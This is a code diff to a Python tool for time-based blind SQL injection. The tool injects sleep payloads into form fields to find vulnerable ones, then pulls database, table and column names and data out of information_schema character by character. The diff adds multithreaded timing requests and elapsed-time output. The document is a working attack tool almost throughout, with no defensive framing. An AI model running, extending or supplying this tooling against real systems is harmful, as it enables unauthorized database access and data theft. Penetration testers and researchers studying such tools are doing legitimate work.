@@ -1,6 +1,8 @@
 # time-based-sql-injection
 
-import sys, argparse, ast, requests
+import sys, argparse, ast, requests, threading, time, datetime
+
+from requests.sessions import default_headers
 
 M_GET = 'GET'
 M_POST = 'POST'
@@ -64,7 +66,7 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field,
             print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-        elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
         if elapsed >= sleep_time:
             found = True
         else:
@@ -80,27 +82,33 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field,
     return count
 
 def print_user_choice_table(values, title = ''):
-    if len(values) == 1:
-        print('Only one value')
-        print('Choice: %s' % values[0])
-        return 0
-    if title:
-        print(title)
+    try:
+        if len(values) == 0:
+            print('Empty value')
+            raise Exception
+        if len(values) == 1:
+            print('Only one value')
+            print('Choice: %s' % values[0])
+            return 0
+        if title:
+            print(title)
 
-    for i in range(len(values)):
-        print(str(i+1) + ' - ' + values[i])
-    print('\n')
+        for i in range(len(values)):
+            print(str(i+1) + ' - ' + values[i])
+        print('\n')
 
-    choice = -1
-    while choice < 0 or choice >= (len(values)):
-        print('\033[A                             \033[A')
-        try:
-            choice = int(input('Choice[1 - ' + str(len(values)) + ']:')) - 1
-        except Exception as e:
-            choice = -1
-            pass
+        choice = -1
+        while choice < 0 or choice >= (len(values)):
+            print('\033[A                             \033[A')
+            try:
+                choice = int(input('Choice[1 - ' + str(len(values)) + ']:')) - 1
+            except Exception as e:
+                choice = -1
+                pass
 
-    return choice
+        return choice
+    except Exception:
+        quit()
 
 def avg_time(times):
     if len(times) == 1:
@@ -127,8 +135,8 @@ def avg_time(times):
 def evaluate_response_time(url, method, headers, cookies, data):
     times = []
     for i in range(EVALUATING_ROUNDS):
-        times.append(measure_request_time_no_threads(url, method, headers, cookies, data))
-    # print(times)
+        times.append(measure_request_time(url, method, headers, cookies, data))
+    print(times)
     return avg_time(times)
 
 def evaluate_sleep_time(response_time):
@@ -150,7 +158,33 @@ def measure_request_time_no_threads(url, method, headers, cookies, data):
         return r.elapsed.total_seconds()
     else:
         return -1
+class myRequestThread(threading.Thread):
+    def __init__(self, threadID, name, url, method, headers, cookies, data, times):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.url = url
+        self.method = method
+        self.headers = headers
+        self.cookies = cookies
+        self.data = data
+        self.times = times
+    def run(self):
+        self.times.append(measure_request_time_no_threads(self.url, self.method, self.headers, self.cookies, self.data))
 
+def measure_request_time(url, method, headers, cookies, data):
+    if threads_num <= 1:
+        return measure_request_time_no_threads(url, method, headers, cookies, data)
+    else:
+        times = []
+        threads = []
+        for i in range(threads_num):
+            t = myRequestThread(i, 'T-'+str(i), url, method, headers, cookies, data, times)
+            t.start()
+            threads.append(t)
+        for t in threads:
+            t.join()
+        return avg_time(times)
 
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     vuln_fields ={}
@@ -159,7 +193,7 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     elapsed_time = -1
     for field in m_data:
         m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
-        elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
 
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:COMMENT_SUFF})
@@ -171,7 +205,7 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
 
     for field in m_data:
         m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
-        elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:AND_SUFF})
     for field in vuln_fields:
@@ -182,7 +216,7 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
 
     for field in m_data:
         m_data[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
-        elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:NO_SUFF})
 
@@ -244,7 +278,7 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
                 print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
             if log:
                 file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-            elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+            elapsed = measure_request_time(url, method, headers, cookies, m_data)
 
             if elapsed >= sleep_time:
                 data_val.append(chr(current))
@@ -257,7 +291,7 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
                     print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
                 if log:
                     file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-                elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+                elapsed = measure_request_time(url, method, headers, cookies, m_data)
                 if elapsed >= sleep_time:
                     low = current
                 else:
@@ -293,7 +327,7 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
             print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-        elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
         if elapsed == -1:
             return -1
         if elapsed >= sleep_time:
@@ -354,7 +388,7 @@ def main(argv):
     verbose = args.verbose
     log = args.log
 
-    print("data:", type(data))
+    # print("data:", type(data))
 
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
@@ -382,14 +416,17 @@ def main(argv):
     sel_vuln_field = vuln_fields[f]
     sel_vuln_type = vuln[sel_vuln_field]
 
-    # Cerco i nomi dei database #
     print('\nLooking for database names, please wait...')
 
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
     for i in range(rows_count):
         databases.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, INF_SCHEMA_SCHEMATA_SCHEMA_NAME, sleep_time, i))
         print('Found: %s' % databases[i])
-    print
+        
+    elapsed = time.time() - start_time
+    times = str(datetime.timedelta(seconds=elapsed)).split(".")
+    times = times[0]
+    print('elapsed time: %s' % times)
     #######################
 
     choice = print_user_choice_table(databases, 'Databases found:')
@@ -403,14 +440,12 @@ def main(argv):
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, sleep_time, where_params, where_values)
     for i in range(rows_count):
         tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_params, where_values))
-    ###########################################
+    
 
-    # Seleziono una tabella #
     choice = print_user_choice_table(tables, 'Tables found:')
     table_name = tables[choice]
     print('\nTable selected: %s\n' % table_name)
 
-    # Cerco i nomi delle colonne nella tabella selezionata #
     print('Looking for columns in %s, please wait...\n' % table_name)
     where_params = [INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_TABLE_SCHEMA]
     where_values = [table_name, db_name]
@@ -442,4 +477,5 @@ def main(argv):
 
 
 if __name__ == "__main__":
+    start_time = time.time()
     main(sys.argv[1:])
